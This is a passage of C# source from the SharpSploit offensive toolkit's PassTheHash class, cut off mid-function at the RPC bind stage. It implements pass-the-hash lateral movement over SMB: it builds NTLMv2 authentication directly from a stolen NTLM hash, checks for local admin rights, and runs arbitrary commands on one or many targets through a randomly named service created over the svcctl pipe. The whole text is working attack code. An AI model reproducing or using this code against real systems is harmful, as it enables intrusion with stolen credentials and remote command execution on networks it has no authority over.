using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using SharpSploit.Execution;
using SharpSploit.Misc;

namespace SharpSploit.LateralMovement
{
    public class PassTheHash
    {
         /// <summary>
        /// Determines if a username and hash has administrative privilege on a Target
        /// </summary>
        /// <param name="username">The Username to query.</param>
        /// <param name="hash">The NTLM hash for the user</param>
        /// <param name="domain">The logon domain for the user</param>
        /// <param name="Target">The Target to query.</param>
        /// <returns>True for Admin, False for not.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static bool SMBAdminCheckWithHash(string username, string hash, string domain, string Target)
        {
            string result = SMBExecuteWithHash(username, hash, domain, Target, AdminCheck: true);
            if (result.Contains(" is a local administrator on "))
                return true;
            else
                return false;
        }


        /// <summary>
        /// Execute a command against multiple targets using Pass the Hash and SMB
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="targets">The Target computers to run the command on.</param>
        /// <param name="command">The Command to execute on the Target</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="ServiceName">The name to give the SMB service for execution.</param>
        /// <param name="AdminCheck">Check only if user is Admin on targets.</param>
        /// <param name="ComSpec">Append %COMSPEC% /C to command. (default=true)</param>
        /// <param name="ForceSMB1">Force usage of SMBv1.</param>
        /// <param name="debug">Include debug information in the output.</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string SMBExecuteWithHash(string username, string hash, string domain, List<string> targets, string command = "", int sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool debug = false)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var Target in targets)
            {
                sb.AppendLine(SMBExecuteWithHash(username, hash, domain, Target, command, sleep, ServiceName, AdminCheck, ComSpec, ForceSMB1, debug));
            }

            return sb.ToString();
        }

        /// <summary>
        /// Execute a command against multiple targets using Pass the Hash and SMB
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="Target">The Target computer to run the command on.</param>
        /// <param name="command">The Command to execute on the Target</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="ServiceName">The name to give the SMB service for execution.</param>
        /// <param name="AdminCheck">Check only if user is Admin on targets.</param>
        /// <param name="ComSpec">Append %COMSPEC% /C to command. (default=true)</param>
        /// <param name="ForceSMB1">Force usage of SMBv1.</param>
        /// <param name="debug">Include debug information in the output.</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string SMBExecuteWithHash(string username, string hash, string domain, string Target, string command = "", int sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool debug = false)
        {
            //Trackers
            bool Login_Successful = false;
            bool Service_Deleted = false;
            bool SMBExec_Failed = false;
            bool SMB_execute = false;
            bool SMB_Signing = false;
            string Output_Username;
            string processID = BitConverter.ToString(BitConverter.GetBytes(Process.GetCurrentProcess().Id)).Replace("-", "");
            string[] processID2 = processID.Split('-');
            StringBuilder output = new StringBuilder();
            int SMB2_Message_ID = 0;
            int SMB_Close_Service_Handle_Stage = 0;
            int SMB_Split_Stage = 0;
            int SMB_Split_Index_Tracker = 0;
            double SMB_Split_Stage_final = 0;
            //Communication
            byte[] SMBClientReceive = null;
            //Packet Reqs
            byte[] Process_ID_Bytes = Utilities.ConvertStringToByteArray(processID.ToString());
            byte[] SMB_Session_ID = null;
            byte[] Session_Key = null;
            byte[] SMB_Session_Key_Length = null;
            byte[] SMB_Negotiate_Flags = null;
            byte[] SMB2_Tree_ID = null;
            byte[] SMB_Client_Send = null;
            byte[] SMB_FID = new byte[2];
            byte[] SMB_Service_Manager_Context_Handle = null;
            byte[] SMB_Service_Context_Handle = null;
            byte[] SMB_Named_Pipe_Bytes = null;
            byte[] SMB_File_ID = null;
            byte[] SMB_User_ID = null;
            byte[] SMB_Header = null;
            byte[] SMB2_Header = null;
            byte[] SMB_Data = null;
            byte[] SMB2_Data = null;
            byte[] NetBIOS_Session_Service = null;
            byte[] NTLMSSP_Negotiate = null;
            byte[] NTLMSSP_Auth = null;
            byte[] SMB_Sign = null;
            byte[] SMB_Signature = null;
            byte[] SMB_Signature2 = null;
            byte[] SMB2_Sign = null;
            byte[] SMB2_Signature = null;
            byte[] SMB_Signing_Sequence = null;
            byte[] RPC_Data = null;
            byte[] SCM_Data = null;
            OrderedDictionary Packet_SMB_Header = null;
            OrderedDictionary Packet_SMB2_Header = null;
            OrderedDictionary Packet_SMB_Data = null;
            OrderedDictionary Packet_SMB2_Data = null;
            OrderedDictionary Packet_NTLMSSP_Negotiate = null;
            OrderedDictionary Packet_NTLMSSP_Auth = null;
            OrderedDictionary Packet_RPC_Data = null;
            OrderedDictionary Packet_SCM_Data = null;
            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();

            if (String.IsNullOrEmpty(username) || String.IsNullOrEmpty(hash) || String.IsNullOrEmpty(Target))
            {
                output.AppendLine("Missing Required Params");
            }
            else
            {
                if (hash.Contains(":"))
                    hash = hash.Split(':').Last();
            }
            if (!string.IsNullOrEmpty(domain))
                Output_Username = domain + '\\' + username;
            else
                Output_Username = username;


            if (!AdminCheck)
            {
                if (debug) { output.AppendLine("AdminCheck is false"); }
                if (!string.IsNullOrEmpty(command))
                {
                    if (debug) { output.AppendLine("String is not empty"); }
                    SMB_execute = true;
                }
            }

            TcpClient SMBClient = new TcpClient();
            SMBClient.Client.ReceiveTimeout = 60000;

            try
            {
                SMBClient.Connect(Target, 445);
            }
            catch
            {
                output.AppendLine("Could not connect to Target");
            }

            if (SMBClient.Connected)
            {
                if (debug) { output.AppendLine(String.Format("Connected to {0}", Target)); }
                NetworkStream SMBClientStream = SMBClient.GetStream();
                SMBClientReceive = new byte[1024];
                string SMBClientStage = "NegotiateSMB";

                while (SMBClientStage != "exit")
                {
                    if (debug) { output.AppendLine(String.Format("Current Stage: {0}", SMBClientStage)); }
                    switch (SMBClientStage)
                    {
                        case "NegotiateSMB":
                            {
                                Packet_SMB_Header = new OrderedDictionary();
                                Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x72 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });
                                Packet_SMB_Data = SMBExec.SMBNegotiateProtocolRequest(ForceSMB1);
                                SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                {
                                    ForceSMB1 = true;
                                    if (debug) { output.AppendLine("Using SMB1"); }
                                    SMBClientStage = "NTLMSSPNegotiate";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[39] }).ToLower() == "0f")
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
                                        SMB_Signing = true;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };

                                    }
                                    else
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                        SMB_Signing = false;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x05, 0x82, 0x08, 0xa0 };

                                    }
                                }
                                else
                                {
                                    if (debug) { output.AppendLine("Using SMB2"); }
                                    SMBClientStage = "NegotiateSMB2";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[70] }) == "03")
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
                                        SMB_Signing = true;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };
                                    }
                                    else
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                        SMB_Signing = false;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x05, 0x80, 0x08, 0xa0 };
                                    }
                                }
                            }
                            break;
                        case "NegotiateSMB2":
                            {
                                SMB2_Message_ID = 1;
                                Packet_SMB2_Header = new OrderedDictionary();
                                SMB2_Tree_ID = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                                SMB_Session_ID = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x00, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                Packet_SMB2_Data = SMBExec.SMB2NegotiateProtocolRequest();
                                SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                SMBClientStage = "NTLMSSPNegotiate";

                            }
                            break;
                        case "NTLMSSPNegotiate":
                            {
                                SMB_Client_Send = null;
                                if (ForceSMB1)
                                {
                                    Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });

                                    if (SMB_Signing)
                                    {
                                        Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                    }
                                    Packet_NTLMSSP_Negotiate = SMBExec.NTLMSSPNegotiate(SMB_Negotiate_Flags, null);
                                    SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                                    Packet_SMB_Data = SMBExec.SMBSessionSetupAndXRequest(NTLMSSP_Negotiate);
                                    SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                }
                                else
                                {
                                    Packet_SMB2_Header = new OrderedDictionary();
                                    SMB2_Message_ID += 1;
                                    Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                    Packet_NTLMSSP_Negotiate = SMBExec.NTLMSSPNegotiate(SMB_Negotiate_Flags, null);
                                    SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                                    Packet_SMB2_Data = SMBExec.SMB2SessionSetupRequest(NTLMSSP_Negotiate);
                                    SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                }
                                SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                SMBClientStage = "exit";
                            }
                            break;

                    }
                }
                if (debug) { output.AppendLine(String.Format("Authenticating to {0}", Target)); }
                string SMB_NTLSSP = BitConverter.ToString(SMBClientReceive);
                SMB_NTLSSP = SMB_NTLSSP.Replace("-", "");
                int SMB_NTLMSSP_Index = SMB_NTLSSP.IndexOf("4E544C4D53535000");
                int SMB_NTLMSSP_Bytes_Index = SMB_NTLMSSP_Index / 2;
                int SMB_Domain_Length = Utilities.DataLength(SMB_NTLMSSP_Bytes_Index + 12, SMBClientReceive);
                int SMB_Target_Length = Utilities.DataLength(SMB_NTLMSSP_Bytes_Index + 40, SMBClientReceive);
                SMB_Session_ID = Utilities.GetByteRange(SMBClientReceive, 44, 51);
                byte[] SMB_NTLM_challenge = Utilities.GetByteRange(SMBClientReceive, SMB_NTLMSSP_Bytes_Index + 24, SMB_NTLMSSP_Bytes_Index + 31);
                byte[] SMB_Target_Details = null;
                SMB_Target_Details = Utilities.GetByteRange(SMBClientReceive, (SMB_NTLMSSP_Bytes_Index + 56 + SMB_Domain_Length), (SMB_NTLMSSP_Bytes_Index + 55 + SMB_Domain_Length + SMB_Target_Length));
                byte[] SMB_Target_Time_Bytes = Utilities.GetByteRange(SMB_Target_Details, SMB_Target_Details.Length - 12, SMB_Target_Details.Length - 5);
                string hash2 = "";
                for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
                string Auth_Hostname = Environment.MachineName;
                byte[] Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
                byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
                byte[] Auth_Username_Bytes = Encoding.Unicode.GetBytes(username);
                byte[] Auth_Domain_Length = BitConverter.GetBytes(Auth_Domain_Bytes.Length);
                Auth_Domain_Length = new byte[] { Auth_Domain_Length[0], Auth_Domain_Length[1] };
                byte[] Auth_Username_Length = BitConverter.GetBytes(Auth_Username_Bytes.Length);
                Auth_Username_Length = new byte[] { Auth_Username_Length[0], Auth_Username_Length[1] };
                byte[] Auth_Hostname_Length = BitConverter.GetBytes(Auth_Hostname_Bytes.Length);
                Auth_Hostname_Length = new byte[] { Auth_Hostname_Length[0], Auth_Hostname_Length[1] };
                byte[] Auth_Domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                byte[] Auth_Username_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + 64);
                byte[] Auth_Hostname_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + 64);
                byte[] Auth_LM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 64);
                byte[] Auth_NTLM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 88);
                HMACMD5 HMAC_MD5 = new HMACMD5();
                HMAC_MD5.Key = NTLM_hash_bytes;
                string Username_And_Target = username.ToUpper();
                byte[] Username_Bytes = Encoding.Unicode.GetBytes(Username_And_Target);
                byte[] Username_And_Target_bytes = Username_Bytes.Concat(Auth_Domain_Bytes).ToArray();
                byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(Username_And_Target_bytes);
                Random r = new Random();
                byte[] Client_Challenge_Bytes = new byte[8];
                r.NextBytes(Client_Challenge_Bytes);



                byte[] Security_Blob_Bytes = (new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                    .Concat(SMB_Target_Time_Bytes)
                    .Concat(Client_Challenge_Bytes)
                    .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                    .Concat(SMB_Target_Details)
                    .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                byte[] Server_Challenge_And_Security_Blob_Bytes = Server_Challenge_And_Security_Blob_Bytes = SMB_NTLM_challenge.Concat(Security_Blob_Bytes).ToArray();
                HMAC_MD5.Key = NTLMv2_hash;
                byte[] NTLMv2_Response = HMAC_MD5.ComputeHash(Server_Challenge_And_Security_Blob_Bytes);
                if (SMB_Signing)
                {
                    byte[] Session_Base_Key = HMAC_MD5.ComputeHash(NTLMv2_Response);
                    Session_Key = Session_Base_Key;
                    HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                    HMAC_SHA256.Key = Session_Key;
                }
                NTLMv2_Response = NTLMv2_Response.Concat(Security_Blob_Bytes).ToArray();
                byte[] NTLMv2_Response_Length = BitConverter.GetBytes(NTLMv2_Response.Length);
                NTLMv2_Response_Length = new byte[] { NTLMv2_Response_Length[0], NTLMv2_Response_Length[1] };
                byte[] SMB_Session_Key_offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + NTLMv2_Response.Length + 88);

                byte[] NTLMSSP_response = (new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 })
                        .Concat(Auth_LM_Offset)
                        .Concat(NTLMv2_Response_Length)
                        .Concat(NTLMv2_Response_Length)
                        .Concat(Auth_NTLM_Offset)
                        .Concat(Auth_Domain_Length)
                        .Concat(Auth_Domain_Length)
                        .Concat(Auth_Domain_offset)
                        .Concat(Auth_Username_Length)
                        .Concat(Auth_Username_Length)
                        .Concat(Auth_Username_Offset)
                        .Concat(Auth_Hostname_Length)
                        .Concat(Auth_Hostname_Length)
                        .Concat(Auth_Hostname_Offset)
                        .Concat(SMB_Session_Key_Length)
                        .Concat(SMB_Session_Key_Length)
                        .Concat(SMB_Session_Key_offset)
                        .Concat(SMB_Negotiate_Flags)
                        .Concat(Auth_Domain_Bytes)
                        .Concat(Auth_Username_Bytes)
                        .Concat(Auth_Hostname_Bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(NTLMv2_Response).ToArray();
                if (ForceSMB1)
                {
                    Packet_SMB_Header = new OrderedDictionary();
                    SMB_User_ID = new byte[] { SMBClientReceive[32], SMBClientReceive[33] };
                    Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });

                    if (SMB_Signing)
                    {
                        Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                    }

                    Packet_SMB_Header["SMBHeader_UserID"] = SMB_User_ID;
                    Packet_NTLMSSP_Negotiate = SMBExec.NTLMSSPAuth(NTLMSSP_response);
                    SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                    Packet_SMB_Data = SMBExec.SMBSessionSetupAndXRequest(NTLMSSP_Negotiate);
                    SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                }
                else
                {
                    SMB2_Message_ID += 1;
                    Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                    Packet_NTLMSSP_Auth = SMBExec.NTLMSSPAuth(NTLMSSP_response);
                    SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                    NTLMSSP_Auth = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Auth);
                    Packet_SMB2_Data = SMBExec.SMB2SessionSetupRequest(NTLMSSP_Auth);
                    SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                }



                SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);

                if (ForceSMB1)
                {
                    if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 9, 12)) == "00-00-00-00")
                    {
                        if (debug) { output.AppendLine("Authentication Successful"); }
                        Login_Successful = true;
                    }
                    else
                    {
                        output.AppendLine("Unable to authenticate to Target.");
                        return output.ToString();
                    }
                }
                else
                {
                    if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) == "00-00-00-00")
                    {
                        if (debug) { output.AppendLine("Authentication Successful"); }
                        Login_Successful = true;
                    }
                    else
                    {
                        output.AppendLine("Unable to Authenticate to Target.");
                        return output.ToString();
                    }
                }

                if (debug) { output.AppendLine(String.Format("Login Status: {0}", Login_Successful)); }
                if (Login_Successful)
                {
                    byte[] SMBExec_Command;
                    byte[] SMB_Path_Bytes;
                    string SMB_Path = "\\\\" + Target + "\\IPC$";

                    if (ForceSMB1)
                    {
                        SMB_Path_Bytes = Encoding.UTF8.GetBytes(SMB_Path).Concat(new byte[] { 0x00 }).ToArray();
                    }
                    else
                    {
                        SMB_Path_Bytes = Encoding.Unicode.GetBytes(SMB_Path);
                    }

                    byte[] SMB_named_pipe_UUID = { 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03 };
                    byte[] SMB_Service_Bytes;
                    string SMB_Service = null;
                    if (string.IsNullOrEmpty(ServiceName))
                    {
                        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                        var rand = new Random();
                        SMB_Service = new string(Enumerable.Repeat(chars, 20).Select(s => s[rand.Next(s.Length)]).ToArray());
                        SMB_Service_Bytes = Encoding.Unicode.GetBytes(SMB_Service).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                    }
                    else
                    {
                        SMB_Service = ServiceName;
                        SMB_Service_Bytes = Encoding.Unicode.GetBytes(SMB_Service);
                        if (Convert.ToBoolean(SMB_Service.Length % 2))
                        {
                            SMB_Service_Bytes = SMB_Service_Bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                        }
                        else
                        {
                            SMB_Service_Bytes = SMB_Service_Bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                        }
                    }
                    if (debug) { output.AppendLine(String.Format("Service Name is {0}", SMB_Service)); }
                    byte[] SMB_Service_Length = BitConverter.GetBytes(SMB_Service.Length + 1);

                    if (ComSpec)
                    {
                        if (debug) { output.AppendLine("Appending %COMSPEC% /C"); }

                        command = "%COMSPEC% /C \"" + command + "\"";
                    }

                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    List<byte> SMBExec_Command_List = new List<byte>();
                    foreach (byte commandByte in commandBytes)
                    {
                        SMBExec_Command_List.Add(commandByte);
                        SMBExec_Command_List.Add(0x00);

                    }
                    byte[] SMBExec_Command_Init = SMBExec_Command_List.ToArray();

                    if (Convert.ToBoolean(command.Length % 2))
                    {
                        SMBExec_Command = SMBExec_Command_Init.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                    }
                    else
                    {
                        SMBExec_Command = SMBExec_Command_Init.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                    }
                    byte[] SMBExec_Command_Length_bytes = BitConverter.GetBytes(SMBExec_Command.Length / 2);
                    int SMB_Split_Index = 4256;
                    int SMB_Signing_Counter = 0;
                    byte[] SMB_Tree_ID = new byte[2];
                    string SMB_Client_Stage_Next = "";
                    if (ForceSMB1)
                    {
                        SMBClientStage = "TreeConnectAndXRequest";
                        while (SMBClientStage != "exit" && SMBExec_Failed == false)
                        {
                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                            switch (SMBClientStage)
                            {
                                case "TreeConnectAndXRequest":
                                    {
                                        Packet_SMB_Header = new OrderedDictionary();
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x75 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter = 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBTreeConnectAndXRequest(SMB_Path_Bytes);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }

                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "CreateAndXRequest";
                                    }
                                    break;
                                case "CreateAndXRequest":
                                    {
                                        SMB_Named_Pipe_Bytes = new byte[] { 0x5c, 0x73, 0x76, 0x63, 0x63, 0x74, 0x6c, 0x00 }; //svcctl
                                        SMB_Tree_ID = Utilities.GetByteRange(SMBClientReceive, 28, 29);
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0xa2 }, new byte[] { 0x18 }, new byte[] { 0x02, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBNTCreateAndXRequest(SMB_Named_Pipe_Bytes);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "RPCBind";

                                    }
                                    break;
                                case "RPCBind":
                                    {
                                        SMB_FID = Utilities.GetByteRange(SMBClientReceive, 42, 43);
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
